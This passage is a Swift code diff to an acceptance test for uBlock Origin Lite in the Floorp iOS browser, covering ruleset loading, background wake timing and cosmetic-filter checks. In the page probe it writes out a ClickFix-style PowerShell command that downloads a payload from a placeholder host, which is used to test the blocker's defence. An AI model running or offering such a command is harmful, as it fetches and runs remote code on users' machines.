@@ -591,9 +591,13 @@ private struct FloorpUBOLReleaseBrowserEnvironment {
 private final class FloorpUBOLReleaseAcceptanceSession {
     private static let defaultRulesets = ["ublock-filters", "easylist", "easyprivacy"]
     private static let japaneseRuleset = "jpn-1"
+    private static let coldBackgroundReadinessTimeoutNanoseconds: UInt64 = 240_000_000_000
+    private static let warmBackgroundReadinessTimeoutNanoseconds: UInt64 = 90_000_000_000
     private static let expectedDefaultRuleCount = 113_100
     private static let expectedJapaneseRuleCount = 1_906
-    private static let dynamicRuleID = 2_000_000_001
+    // Exercise a foreign dynamic rule in uBO Lite's preserved special-rule
+    // realm without making it look like a storage-backed user rule (>= 9M).
+    private static let dynamicRuleID = 7_000_001
     private static let sessionRuleID = 2_000_000_002
 
     private let webExtension: WKWebExtension
@@ -671,38 +675,12 @@ private final class FloorpUBOLReleaseAcceptanceSession {
         let server = try Self.makeServer()
         defer { server.stop() }
 
-        // Floorp restores enabled contexts before a scene publishes ordinary
-        // browsing WebViews. On iOS 26, opening those tabs before loading the
-        // context can make WebKit fail an extension-page navigation through its
-        // private Gestures state machine (`failed(deinit)`). Keep this gate on
-        // the same lifecycle order as the production host.
-        try controller.load(context)
-        // Create the release gate's extension-page driver from the clean
-        // post-load configuration before explicitly waking the nonpersistent
-        // MV3 background. The page's readiness request performs the first wake;
-        // constructing the first detached extension page after that wake hits
-        // an iOS 26 WebKit Gestures invalid transition. Real Floorp surfaces are
-        // attached to a window and are covered by the production-host tests.
-        print("FLOORP_UBOL_RELEASE_GATE context-loaded")
-        let readyPage = try await Self.makeReadyExtensionPage(
-            context: context,
-            baseURL: context.baseURL
-        )
-        print("FLOORP_UBOL_RELEASE_GATE extension-page-ready")
-        retainedExtensionWebView = readyPage.webView
-        extensionNavigationWaiter = readyPage.waiter
-        try await Self.loadBackgroundContent(in: context)
-        print("FLOORP_UBOL_RELEASE_GATE background-loaded")
+        try await prepareInitialExtensionPage()
 
         let browser = makeBrowserEnvironment()
         browser.open(using: controller)
         defer { browser.close(using: controller) }
         let normalWebView = browser.normalWebView
-        let privateWebView = browser.privateWebView
-        let normalTab = browser.normalTab
-        let privateTab = browser.privateTab
-        let normalWindow = browser.normalWindow
-        let privateWindow = browser.privateWindow
 
         print("FLOORP_UBOL_RELEASE_GATE optimal-config")
         let optimalLevel = try await configureOptimalMode()
@@ -733,32 +711,33 @@ private final class FloorpUBOLReleaseAcceptanceSession {
         let complete = try await loadAndInspect(normalURL, in: normalWebView)
 
         print("FLOORP_UBOL_RELEASE_GATE japanese")
+        print("FLOORP_UBOL_RELEASE_GATE japanese-enable-rulesets")
         let enabledWithJapanese = try await applyRulesets(
             Self.defaultRulesets + [Self.japaneseRuleset]
         )
+        print("FLOORP_UBOL_RELEASE_GATE japanese-count-rules")
         let ruleCountsAfterRulesetUpdate = try await acceptanceDNRRuleCounts()
+        print("FLOORP_UBOL_RELEASE_GATE japanese-restore-session")
         let restoredSessionRuleCount = try await restoreAcceptanceSessionRule()
+        print("FLOORP_UBOL_RELEASE_GATE japanese-wait-scripts")
         let japaneseScriptIDs = try await waitForRegisteredContentScripts(
             containing: ["jpn-1.main", "jpn-1.isolated"]
         )
+        print("FLOORP_UBOL_RELEASE_GATE japanese-inspect-registrations")
         let japaneseScriptRegistrations = try await registeredContentScriptRegistrations()
+        print("FLOORP_UBOL_RELEASE_GATE japanese-load-page")
         let japanese = try await loadAndInspect(normalURL, in: normalWebView)
+        print("FLOORP_UBOL_RELEASE_GATE japanese-complete")
 
         print("FLOORP_UBOL_RELEASE_GATE private")
-        normalWebView.isHidden = true
-        privateWebView.isHidden = false
-        browser.delegate.focusedWindow = privateWindow
-        controller.didFocusWindow(privateWindow)
-        controller.didActivateTab(privateTab, previousActiveTab: nil)
-        let privateBrowsing = try await loadAndInspect(normalURL, in: privateWebView)
-        privateWebView.isHidden = true
-        normalWebView.isHidden = false
-        browser.delegate.focusedWindow = normalWindow
-        controller.didFocusWindow(normalWindow)
-        controller.didActivateTab(normalTab, previousActiveTab: nil)
+        let privateBrowsing = try await inspectPrivateBrowsing(normalURL, in: browser)
 
         print("FLOORP_UBOL_RELEASE_GATE background-wake")
         try await removeAcceptanceDNRRules()
+        let coldDocumentStart = try await verifyDocumentStartAfterBackgroundIdleWindow(
+            normalURL,
+            in: normalWebView
+        )
         let backgroundWake = try await verifyBackgroundWakePreservesState()
         print("FLOORP_UBOL_RELEASE_GATE report")
 
@@ -793,9 +772,68 @@ private final class FloorpUBOLReleaseAcceptanceSession {
             complete: complete,
             japanese: japanese,
             privateBrowsing: privateBrowsing,
+            coldDocumentStart: coldDocumentStart,
             backgroundWake: backgroundWake,
             contextErrors: context.errors.map(FloorpUBOLDNRErrorRecord.init)
         )
+    }
+
+    private func prepareInitialExtensionPage() async throws {
+        // Floorp restores enabled contexts before a scene publishes ordinary
+        // browsing WebViews. On iOS 26, opening those tabs before loading the
+        // context can make WebKit fail an extension-page navigation through its
+        // private Gestures state machine (`failed(deinit)`). Keep this gate on
+        // the same lifecycle order as the production host.
+        try controller.load(context)
+        // Create and retain exactly one extension-page driver before explicitly
+        // waking the nonpersistent MV3 background, matching the production
+        // readiness lifecycle. A timed-out native JavaScript callback still owns
+        // this page, so retrying with another detached page would be unsafe.
+        print("FLOORP_UBOL_RELEASE_GATE context-loaded")
+        let readinessDeadline = Self.makeReadinessDeadline(
+            timeoutNanoseconds: Self.coldBackgroundReadinessTimeoutNanoseconds
+        )
+        let readyPage = try Self.makeExtensionPage(context: context)
+        retainedExtensionWebView = readyPage.webView
+        extensionNavigationWaiter = readyPage.waiter
+        try await readyPage.waiter.load(
+            context.baseURL.appendingPathComponent("web_accessible_resources/noop.html"),
+            in: readyPage.webView,
+            timeoutNanoseconds: min(
+                try Self.remainingReadinessTimeout(until: readinessDeadline),
+                5_000_000_000
+            ),
+            timeoutPolicy: .preserveWebViewForProcessLifetime
+        )
+        print("FLOORP_UBOL_RELEASE_GATE extension-page-loaded")
+        try await Self.loadBackgroundContent(
+            in: context,
+            timeoutNanoseconds: try Self.remainingReadinessTimeout(until: readinessDeadline)
+        )
+        print("FLOORP_UBOL_RELEASE_GATE background-loaded")
+        try await Self.waitUntilBackgroundIsReady(
+            in: readyPage.webView,
+            timeoutNanoseconds: try Self.remainingReadinessTimeout(until: readinessDeadline)
+        )
+        print("FLOORP_UBOL_RELEASE_GATE extension-page-ready")
+    }
+
+    private func inspectPrivateBrowsing(
+        _ pageURL: URL,
+        in browser: FloorpUBOLReleaseBrowserEnvironment
+    ) async throws -> FloorpUBOLPageAcceptance {
+        browser.normalWebView.isHidden = true
+        browser.privateWebView.isHidden = false
+        browser.delegate.focusedWindow = browser.privateWindow
+        controller.didFocusWindow(browser.privateWindow)
+        controller.didActivateTab(browser.privateTab, previousActiveTab: nil)
+        let result = try await loadAndInspect(pageURL, in: browser.privateWebView)
+        browser.privateWebView.isHidden = true
+        browser.normalWebView.isHidden = false
+        browser.delegate.focusedWindow = browser.normalWindow
+        controller.didFocusWindow(browser.normalWindow)
+        controller.didActivateTab(browser.normalTab, previousActiveTab: nil)
+        return result
     }
 
     private func inspectActionPopup(
@@ -1136,20 +1174,21 @@ private final class FloorpUBOLReleaseAcceptanceSession {
     private func applyRulesets(_ identifiers: [String]) async throws -> [String] {
         let result = try await extensionWebView.floorpCallAsyncJavaScript(
             """
-            const config = await import(browser.runtime.getURL('js/config.js'));
-            const rulesets = await import(browser.runtime.getURL('js/ruleset-manager.js'));
-            const response = await rulesets.enableRulesets(requested);
-            if ( response?.error ) {
-                throw new Error(response.error);
+            const module = await import(browser.runtime.getURL('js/floorp-reconcile.js'));
+            const response = await module.reconcileProtection({
+                enabledRulesets: requested,
+            });
+            if ( response?.ready !== true ) {
+                throw new Error(response?.error || 'Ruleset reconciliation failed');
             }
-            config.rulesetConfig.enabledRulesets = response.enabledRulesets || requested;
-            await config.saveRulesetConfig();
-            const scripting = await import(browser.runtime.getURL('js/scripting-manager.js'));
-            await scripting.registerContentScripts();
             return await browser.declarativeNetRequest.getEnabledRulesets();
             """,
             arguments: ["requested": identifiers],
-            contentWorld: .page
+            contentWorld: .page,
+            // WebKit recompiles the whole enabled static ruleset set here. On
+            // slower simulator runs the supported foreground transaction can
+            // legitimately exceed the generic 60-second JavaScript limit.
+            timeoutNanoseconds: Self.coldBackgroundReadinessTimeoutNanoseconds
         )
         guard let enabled = result as? [String] else {
             throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
@@ -1217,6 +1256,8 @@ private final class FloorpUBOLReleaseAcceptanceSession {
                 excludesLocalhost: (script.excludeMatches || []).some(match =>
                     String(match).includes('localhost')
                 ),
+                allFrames: script.allFrames === true,
+                matchOriginAsFallback: script.matchOriginAsFallback === true,
                 runAt: script.runAt || '',
             }));
             """,
@@ -1253,19 +1294,39 @@ private final class FloorpUBOLReleaseAcceptanceSession {
     private func loadAndInspect(
         _ url: URL,
         in webView: WKWebView,
-        expectedCustomCosmeticFilters: Bool = true
+        expectedCustomCosmeticFilters: Bool = true,
+        navigationTimeoutPolicy: FloorpUBOLNavigationTimeoutPolicy = .stopLoading
     ) async throws
         -> FloorpUBOLPageAcceptance {
         let waiter = FloorpUBOLNavigationWaiter()
-        try await waiter.load(url, in: webView)
+        do {
+            try await waiter.load(
+                url,
+                in: webView,
+                timeoutPolicy: navigationTimeoutPolicy
+            )
+        } catch {
+            if FloorpNativeWebExtensionProcessLifetimeWebViewRegistry.mustPreserve(webView) {
+                retainedRuntimeObjects.append(waiter)
+            }
+            throw error
+        }
         let requiredSamples = expectedCustomCosmeticFilters ? 1 : 8
         var consecutiveExpectedSamples = 0
-        var lastStates = (custom: false, procedural: false)
+        var lastStates = FloorpUBOLCustomCosmeticFilterStates(
+            custom: false,
+            procedural: false,
+            originFallbackCustom: false,
+            originFallbackProcedural: false,
+            originFallbackDiagnostic: "not sampled"
+        )
         for _ in 0..<20 {
             let states = try await customCosmeticFilterStates(in: webView)
             lastStates = states
             if states.custom == expectedCustomCosmeticFilters,
-               states.procedural == expectedCustomCosmeticFilters {
+               states.procedural == expectedCustomCosmeticFilters,
+               states.originFallbackCustom == expectedCustomCosmeticFilters,
+               states.originFallbackProcedural == expectedCustomCosmeticFilters {
                 consecutiveExpectedSamples += 1
                 if consecutiveExpectedSamples >= requiredSamples {
                     break
@@ -1278,7 +1339,10 @@ private final class FloorpUBOLReleaseAcceptanceSession {
         guard consecutiveExpectedSamples >= requiredSamples else {
             throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                 "custom cosmetic states at \(url.absoluteString) remained "
-                    + "custom=\(lastStates.custom), procedural=\(lastStates.procedural); "
+                    + "custom=\(lastStates.custom), procedural=\(lastStates.procedural), "
+                    + "originFallbackCustom=\(lastStates.originFallbackCustom), "
+                    + "originFallbackProcedural=\(lastStates.originFallbackProcedural), "
+                    + "originFallbackDiagnostic=\(lastStates.originFallbackDiagnostic); "
                     + "expected both \(expectedCustomCosmeticFilters) for "
                     + "\(requiredSamples) samples"
             )
@@ -1307,19 +1371,40 @@ private final class FloorpUBOLReleaseAcceptanceSession {
 
     private func customCosmeticFilterStates(
         in webView: WKWebView
-    ) async throws -> (custom: Bool, procedural: Bool) {
+    ) async throws -> FloorpUBOLCustomCosmeticFilterStates {
         let raw = try await webView.floorpCallAsyncJavaScript(
             """
-            const hidden = id => {
-                const element = document.getElementById(id);
+            const hidden = (scope, id) => {
+                const element = scope?.getElementById(id);
                 if (!element) return false;
-                const style = getComputedStyle(element);
+                const style = scope.defaultView.getComputedStyle(element);
                 return style.display === 'none' || style.visibility === 'hidden' ||
                     Number(style.opacity) === 0;
             };
+            const originFallbackDocument = document.getElementById(
+                'floorp-origin-fallback-frame'
+            )?.contentDocument;
+            const originFallbackProceduralElement = originFallbackDocument
+                ?.getElementById('floorp-procedural-cosmetic');
             return {
-                custom: hidden('floorp-custom-cosmetic'),
-                procedural: hidden('floorp-procedural-cosmetic')
+                custom: hidden(document, 'floorp-custom-cosmetic'),
+                procedural: hidden(document, 'floorp-procedural-cosmetic'),
+                originFallbackCustom: hidden(
+                    originFallbackDocument,
+                    'floorp-custom-cosmetic'
+                ),
+                originFallbackProcedural: hidden(
+                    originFallbackDocument,
+                    'floorp-procedural-cosmetic'
+                ),
+                originFallbackDiagnostic: JSON.stringify({
+                    readyState: originFallbackDocument?.readyState ?? 'missing',
+                    attributes: originFallbackProceduralElement?.getAttributeNames() ?? [],
+                    text: originFallbackProceduralElement?.textContent ?? 'missing',
+                    engine: originFallbackDocument?.documentElement?.getAttribute(
+                        'data-floorp-procedural-diagnostic'
+                    ) ?? 'missing'
+                })
             };
             """,
             arguments: [:],
@@ -1328,47 +1413,91 @@ private final class FloorpUBOLReleaseAcceptanceSession {
         )
         guard let values = raw as? [String: Any],
               let custom = values["custom"] as? Bool,
-              let procedural = values["procedural"] as? Bool else {
+              let procedural = values["procedural"] as? Bool,
+              let originFallbackCustom = values["originFallbackCustom"] as? Bool,
+              let originFallbackProcedural = values["originFallbackProcedural"] as? Bool,
+              let originFallbackDiagnostic = values["originFallbackDiagnostic"] as? String else {
             throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                 "custom cosmetic probe returned \(String(describing: raw))"
             )
         }
-        return (custom, procedural)
+        return FloorpUBOLCustomCosmeticFilterStates(
+            custom: custom,
+            procedural: procedural,
+            originFallbackCustom: originFallbackCustom,
+            originFallbackProcedural: originFallbackProcedural,
+            originFallbackDiagnostic: originFallbackDiagnostic
+        )
     }
 
     private func inspectCurrentPage(in webView: WKWebView) async throws
         -> FloorpUBOLPageAcceptance {
         let raw = try await webView.floorpCallAsyncJavaScript(
             """
-            const hidden = id => {
-                const element = document.getElementById(id);
+            const hidden = (scope, id) => {
+                const element = scope?.getElementById(id);
                 if (!element) return false;
-                const style = getComputedStyle(element);
+                const style = scope.defaultView.getComputedStyle(element);
                 return style.display === 'none' || style.visibility === 'hidden' ||
                     Number(style.opacity) === 0;
             };
-            const probe = document.createElement('textarea');
-            probe.value = 'powershell -NoP Invoke-WebRequest https://example.invalid/payload.exe';
+            const originFallbackDocument = document.getElementById(
+                'floorp-origin-fallback-frame'
+            )?.contentDocument;
+            // Exercise uBO Lite's real document.execCommand('copy') trap without
+            // focusing an editable control. A selected textarea opens an iOS
+            // remote-text-input/gesture session; immediately navigating that
+            // WKWebView can then make WebKit fail deinit from its idle phase.
+            const probe = document.createElement('pre');
+            probe.textContent =
+                'powershell -NoP Invoke-WebRequest https://example.invalid/payload.exe';
             document.body.append(probe);
-            probe.select();
-            probe.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true }));
-            document.execCommand('copy');
-            await new Promise(resolve => setTimeout(resolve, 150));
-            const scriptletAlertVisible = document.documentElement.innerText.includes(
-                'uBlock Origin blocked a potential ClickFix attack'
-            );
-            probe.remove();
+            const selection = window.getSelection();
+            const range = document.createRange();
+            let scriptletAlertVisible = false;
+            try {
+                probe.dispatchEvent(new MouseEvent('mousedown', {
+                    bubbles: true,
+                    cancelable: true
+                }));
+                range.selectNodeContents(probe);
+                selection?.removeAllRanges();
+                selection?.addRange(range);
+                document.execCommand('copy');
+                // The uBO proxy and its DOM alert are synchronous. Release the
+                // selection before yielding so no selection state crosses a
+                // navigation boundary even if the later inspection throws.
+                selection?.removeAllRanges();
+                await new Promise(resolve => setTimeout(resolve, 150));
+                scriptletAlertVisible = document.documentElement.innerText.includes(
+                    'uBlock Origin blocked a potential ClickFix attack'
+                );
+            } finally {
+                selection?.removeAllRanges();
+                probe.remove();
+            }
             return {
                 controlScriptExecuted: window.floorpControlScriptExecuted === true,
                 defaultBlockedScriptExecuted: window.floorpDefaultBlockedScriptExecuted === true,
                 dynamicBlockedScriptExecuted: window.floorpDynamicBlockedScriptExecuted === true,
                 sessionBlockedScriptExecuted: window.floorpSessionBlockedScriptExecuted === true,
-                customCosmeticHidden: hidden('floorp-custom-cosmetic'),
-                proceduralCosmeticHidden: hidden('floorp-procedural-cosmetic'),
-                genericCosmeticHidden: hidden('Ad-Container'),
-                highlyGenericCosmeticHidden: hidden('floorp-easylist-high-generic'),
-                japaneseCosmeticHidden: hidden('floorp-japanese-generic'),
-                japaneseHighlyGenericCosmeticHidden: hidden('JP_floorp'),
+                customCosmeticHidden: hidden(document, 'floorp-custom-cosmetic'),
+                proceduralCosmeticHidden: hidden(document, 'floorp-procedural-cosmetic'),
+                originFallbackCustomCosmeticHidden: hidden(
+                    originFallbackDocument,
+                    'floorp-custom-cosmetic'
+                ),
+                originFallbackProceduralCosmeticHidden: hidden(
+                    originFallbackDocument,
+                    'floorp-procedural-cosmetic'
+                ),
+                genericCosmeticHidden: hidden(document, 'Ad-Container'),
+                highlyGenericCosmeticHidden: hidden(
+                    document,
+                    'floorp-easylist-high-generic'
+                ),
+                japaneseCosmeticHidden: hidden(document, 'floorp-japanese-generic'),
+                japaneseHighlyGenericCosmeticHidden: hidden(document, 'JP_floorp'),
                 stockScriptletExecuted: scriptletAlertVisible
             };
             """,
@@ -1541,25 +1670,82 @@ private final class FloorpUBOLReleaseAcceptanceSession {
         )
     }
 
-    private func verifyBackgroundWakePreservesState() async throws
-        -> FloorpUBOLBackgroundWakeAcceptance {
+    private func verifyDocumentStartAfterBackgroundIdleWindow(
+        _ pageURL: URL,
+        in webView: WKWebView
+    ) async throws -> FloorpUBOLPageAcceptance {
         // A WKWebView created from a context's extension-page configuration may
-        // keep the MV3 background alive. Retire that page, allow WebKit to suspend
-        // the background, and then use the same explicit wake path as Floorp does
-        // before navigation. Disable/re-enable itself is intentionally deferred to
-        // the next process and is covered by the host lifecycle integration tests.
+        // keep the MV3 background alive. Retire that page, provide WebKit an idle
+        // window in which it may suspend the background, then make the already-
+        // attached browsing WebView's next document_start message perform the first
+        // activity. There is intentionally no explicit extension-page prewake
+        // between the idle window and this first document. WebKit does not expose a
+        // public suspension-state signal, so this proves the cold-capable path
+        // without claiming that eviction occurred on every run.
+        print("FLOORP_UBOL_RELEASE_GATE background-wake-idle-window")
         retainedExtensionWebView?.floorpTearDownDiagnosticWebViewIfSafe()
         retainedExtensionWebView = nil
         extensionNavigationWaiter = nil
 
         try await Task.sleep(nanoseconds: 35_000_000_000)
-        try await Self.loadBackgroundContent(in: context)
-        let readyPage = try await Self.makeReadyExtensionPage(
-            context: context,
-            baseURL: context.baseURL
+        guard var components = URLComponents(
+            url: pageURL,
+            resolvingAgainstBaseURL: false
+        ) else {
+            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
+                "cannot construct the cold document_start acceptance URL"
+            )
+        }
+        components.queryItems = [
+            URLQueryItem(name: "floorp-cold-document-start", value: "1")
+        ]
+        guard let coldDocumentURL = components.url else {
+            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
+                "cannot construct the cold document_start acceptance URL"
+            )
+        }
+        print("FLOORP_UBOL_RELEASE_GATE background-wake-document-start")
+        let result = try await loadAndInspect(
+            coldDocumentURL,
+            in: webView,
+            navigationTimeoutPolicy: .preserveWebViewForProcessLifetime
         )
+        print("FLOORP_UBOL_RELEASE_GATE background-wake-document-start-complete")
+        return result
+    }
+
+    private func verifyBackgroundWakePreservesState() async throws
+        -> FloorpUBOLBackgroundWakeAcceptance {
+        // The idle-window document_start probe has just exercised background
+        // activity without an extension-page prewake. Create one control page only
+        // after that probe so
+        // we can inspect persisted state without weakening the first-document gate.
+        // Disable/re-enable itself is intentionally deferred to the next process and
+        // is covered by the host lifecycle integration tests.
+        print("FLOORP_UBOL_RELEASE_GATE background-wake-inspect-state")
+        let readinessDeadline = Self.makeReadinessDeadline(
+            timeoutNanoseconds: Self.warmBackgroundReadinessTimeoutNanoseconds
+        )
+        let readyPage = try Self.makeExtensionPage(context: context)
         retainedExtensionWebView = readyPage.webView
         extensionNavigationWaiter = readyPage.waiter
+        try await readyPage.waiter.load(
+            context.baseURL.appendingPathComponent("web_accessible_resources/noop.html"),
+            in: readyPage.webView,
+            timeoutNanoseconds: min(
+                try Self.remainingReadinessTimeout(until: readinessDeadline),
+                5_000_000_000
+            ),
+            timeoutPolicy: .preserveWebViewForProcessLifetime
+        )
+        try await Self.loadBackgroundContent(
+            in: context,
+            timeoutNanoseconds: try Self.remainingReadinessTimeout(until: readinessDeadline)
+        )
+        try await Self.waitUntilBackgroundIsReady(
+            in: readyPage.webView,
+            timeoutNanoseconds: try Self.remainingReadinessTimeout(until: readinessDeadline)
+        )
         let resumedWebView = readyPage.webView
         let scripts = try await waitForRegisteredContentScripts(
             containing: ["css-generic-all", "css-user", "jpn-1.main"],
@@ -1630,7 +1816,8 @@ private final class FloorpUBOLReleaseAcceptanceSession {
     }
 
     private static func loadBackgroundContent(
-        in context: WKWebExtensionContext
+        in context: WKWebExtensionContext,
+        timeoutNanoseconds: UInt64
     ) async throws {
         try await withCheckedThrowingContinuation { continuation in
             let gate = FloorpUBOLBackgroundLoadGate(continuation: continuation)
@@ -1638,54 +1825,31 @@ private final class FloorpUBOLReleaseAcceptanceSession {
                 gate.resolve(error)
             }
             Task { @MainActor in
-                try? await Task.sleep(nanoseconds: 15_000_000_000)
+                try? await Task.sleep(nanoseconds: timeoutNanoseconds)
                 gate.timeout()
             }
         }
     }
 
-    private static func makeReadyExtensionPage(
-        context: WKWebExtensionContext,
-        baseURL: URL
-    ) async throws -> (webView: WKWebView, waiter: FloorpUBOLNavigationWaiter) {
-        var lastError: (any Error)?
-        for attempt in 0..<20 {
-            if attempt > 0 {
-                try await Task.sleep(nanoseconds: 1_000_000_000)
-            }
-            guard let configuration = context.webViewConfiguration else {
-                lastError = FloorpUBOLDNRDiagnosticError.extensionPageConfigurationUnavailable
-                continue
-            }
-            // This driver intentionally follows WebKit's documented extension-
-            // page configuration path exactly. Replacing its user-content
-            // controller strips private configuration state on iOS 26.5 and
-            // makes the first navigation fail inside Gestures.framework.
-            // Production popup isolation has separate host-level coverage.
-            let webView = WKWebView(frame: .zero, configuration: configuration)
-            let waiter = FloorpUBOLNavigationWaiter()
-            do {
-                try await waiter.load(
-                    baseURL.appendingPathComponent("web_accessible_resources/noop.html"),
-                    in: webView
-                )
-                try await waitUntilBackgroundIsReady(in: webView)
-                return (webView, waiter)
-            } catch {
-                lastError = error
-                print(
-                    "FLOORP_UBOL_RELEASE_GATE extension-page-attempt=\(attempt + 1) "
-                        + "error=\((error as NSError).localizedDescription)"
-                )
-                webView.floorpTearDownDiagnosticWebViewIfSafe()
-            }
+    private static func makeExtensionPage(
+        context: WKWebExtensionContext
+    ) throws -> (webView: WKWebView, waiter: FloorpUBOLNavigationWaiter) {
+        guard let configuration = context.webViewConfiguration else {
+            throw FloorpUBOLDNRDiagnosticError.extensionPageConfigurationUnavailable
         }
-        throw lastError ?? FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
-            "uBO Lite background did not become ready"
+        // Preserve WebKit's extension-page configuration exactly. The caller
+        // owns and retains this sole page before starting navigation or native
+        // JavaScript so no callback can outlive its document.
+        return (
+            WKWebView(frame: .zero, configuration: configuration),
+            FloorpUBOLNavigationWaiter()
         )
     }
 
-    private static func waitUntilBackgroundIsReady(in webView: WKWebView) async throws {
+    private static func waitUntilBackgroundIsReady(
+        in webView: WKWebView,
+        timeoutNanoseconds: UInt64
+    ) async throws {
         let result = try await webView.floorpCallAsyncJavaScript(
             """
             const initial = await browser.runtime.sendMessage({ what: 'floorpReadiness' });
@@ -1693,7 +1857,10 @@ private final class FloorpUBOLReleaseAcceptanceSession {
                 return initial;
             }
             const module = await import(browser.runtime.getURL('js/floorp-reconcile.js'));
-            const reconciled = await module.reconcileProtection();
+            const options = typeof initial.settingsRestoreId === 'string'
+                ? { settingsRestoreId: initial.settingsRestoreId }
+                : {};
+            const reconciled = await module.reconcileProtection(options);
             if ( reconciled?.ready !== true ) {
                 return reconciled;
             }
@@ -1701,7 +1868,7 @@ private final class FloorpUBOLReleaseAcceptanceSession {
             """,
             arguments: [:],
             contentWorld: .page,
-            timeoutNanoseconds: 5_000_000_000
+            timeoutNanoseconds: timeoutNanoseconds
         )
         guard let readiness = result as? [String: Any],
               readiness["ready"] as? Bool == true,
@@ -1711,6 +1878,21 @@ private final class FloorpUBOLReleaseAcceptanceSession {
                 "uBO Lite background readiness returned \(String(describing: result))"
             )
         }
+    }
+
+    private static func makeReadinessDeadline(timeoutNanoseconds: UInt64) -> UInt64 {
+        let addition = DispatchTime.now().uptimeNanoseconds.addingReportingOverflow(
+            timeoutNanoseconds
+        )
+        return addition.overflow ? UInt64.max : addition.partialValue
+    }
+
+    private static func remainingReadinessTimeout(until deadline: UInt64) throws -> UInt64 {
+        let now = DispatchTime.now().uptimeNanoseconds
+        guard now < deadline else {
+            throw FloorpUBOLDNRDiagnosticError.javaScriptTimedOut
+        }
+        return deadline - now
     }
 
     nonisolated private static func makeServer() throws -> GCDWebServer {
@@ -1736,6 +1918,15 @@ private final class FloorpUBOLReleaseAcceptanceSession {
             <div id="floorp-easylist-high-generic" class="probe" data-ad-name="floorp-ad">generic high</div>
             <div id="floorp-japanese-generic" class="__isboostReturnAd probe">日本語広告</div>
             <div id="JP_floorp" class="probe" style="display:block">日本語広告 high</div>
+            <iframe id="floorp-origin-fallback-frame" srcdoc="
+                <!doctype html>
+                <base href='https://spoofed-base.invalid/'>
+                <style>.probe { display: block; width: 20px; height: 20px; }</style>
+                <div id='floorp-custom-cosmetic' class='probe'>custom frame</div>
+                <div id='floorp-procedural-cosmetic' class='probe'>
+                    Sponsored by Floorp
+                </div>
+            "></iframe>
             <script src="/floorp-control-acceptance.js"></script>
             <script src="/floorp-default-acceptance.ashx?adid=floorp"></script>
             <script src="/floorp-dynamic-acceptance.js"></script>
@@ -2428,22 +2619,80 @@ private struct FloorpUBOLReleaseAcceptanceReport: Codable {
     let complete: FloorpUBOLPageAcceptance
     let japanese: FloorpUBOLPageAcceptance
     let privateBrowsing: FloorpUBOLPageAcceptance
+    let coldDocumentStart: FloorpUBOLPageAcceptance
     let backgroundWake: FloorpUBOLBackgroundWakeAcceptance
     let contextErrors: [FloorpUBOLDNRErrorRecord]
 
     var succeeded: Bool {
         let expectedJapanese = ["easylist", "easyprivacy", "jpn-1", "ublock-filters"]
+        let expectedDocumentStartFiles = [
+            "/js/scripting/css-api.js",
+            "/js/scripting/css-procedural-api.js",
+            "/js/scripting/css-user.js",
+        ]
+        let expectedDocumentIdleFiles = [
+            "/js/scripting/css-user-idle-prelude.js",
+            "/js/scripting/css-api.js",
+            "/js/scripting/css-procedural-api.js",
+            "/js/scripting/css-user-idle.js",
+            "/js/scripting/css-user.js",
+        ]
+        func hasCustomFilterRegistration(
+            _ identifier: String,
+            javaScriptFiles: [String],
+            runAt: String,
+            in registrations: [FloorpUBOLContentScriptRegistration]
+        ) -> Bool {
+            registrations.contains { registration in
+                registration.identifier == identifier
+                    && registration.javaScriptFiles == javaScriptFiles
+                    && registration.runAt == runAt
+                    && registration.allFrames
+                    && registration.matchOriginAsFallback
+                    && registration.matches == ["*://*.localhost/*"]
+                    && registration.excludeMatchCount == 0
+                    && !registration.excludesLocalhost
+            }
+        }
+        let completeCustomFilterRegistrationsAreValid =
+            hasCustomFilterRegistration(
+                "css-user",
+                javaScriptFiles: expectedDocumentStartFiles,
+                runAt: "document_start",
+                in: completeContentScriptRegistrations
+            )
+            && hasCustomFilterRegistration(
+                "css-user-idle",
+                javaScriptFiles: expectedDocumentIdleFiles,
+                runAt: "document_idle",
+                in: completeContentScriptRegistrations
+            )
+        let japaneseCustomFilterRegistrationsAreValid =
+            hasCustomFilterRegistration(
+                "css-user",
+                javaScriptFiles: expectedDocumentStartFiles,
+                runAt: "document_start",
+                in: japaneseContentScriptRegistrations
+            )
+            && hasCustomFilterRegistration(
+                "css-user-idle",
+                javaScriptFiles: expectedDocumentIdleFiles,
+                runAt: "document_idle",
+                in: japaneseContentScriptRegistrations
+            )
         return packageVersion == "2026.825.1619"
             && defaultStaticRuleCount == 113_100
             && japaneseStaticRuleCount == 1_906
             && optimalFilteringLevel == 2
             && completeFilteringLevel == 3
-            && Set(["css-specific", "css-user", "ublock-filters.main", "ublock-filters.isolated"])
+            && Set(["css-specific", "css-user", "css-user-idle", "ublock-filters.main", "ublock-filters.isolated"])
                 .isSubset(of: Set(optimalRegisteredContentScripts))
-            && Set(["css-generic-all", "css-specific", "css-user", "ublock-filters.main"])
+            && Set(["css-generic-all", "css-specific", "css-user", "css-user-idle", "ublock-filters.main"])
                 .isSubset(of: Set(completeRegisteredContentScripts))
+            && completeCustomFilterRegistrationsAreValid
             && Set(["jpn-1.main", "jpn-1.isolated"])
                 .isSubset(of: Set(japaneseRegisteredContentScripts))
+            && japaneseCustomFilterRegistrationsAreValid
             && enabledRulesetsWithJapanese == expectedJapanese
             && dynamicRuleCount == 1
             && sessionRuleCount == 1
@@ -2466,6 +2715,8 @@ private struct FloorpUBOLReleaseAcceptanceReport: Codable {
             && !optimal.defaultBlockedScriptExecuted
             && optimal.customCosmeticHidden
             && optimal.proceduralCosmeticHidden
+            && optimal.originFallbackCustomCosmeticHidden
+            && optimal.originFallbackProceduralCosmeticHidden
             && !optimal.genericCosmeticHidden
             && !optimal.highlyGenericCosmeticHidden
             && !optimal.japaneseCosmeticHidden
@@ -2474,9 +2725,13 @@ private struct FloorpUBOLReleaseAcceptanceReport: Codable {
             && crossHost.controlScriptExecuted
             && !crossHost.customCosmeticHidden
             && !crossHost.proceduralCosmeticHidden
+            && !crossHost.originFallbackCustomCosmeticHidden
+            && !crossHost.originFallbackProceduralCosmeticHidden
             && crossHostReturn.controlScriptExecuted
             && crossHostReturn.customCosmeticHidden
             && crossHostReturn.proceduralCosmeticHidden
+            && crossHostReturn.originFallbackCustomCosmeticHidden
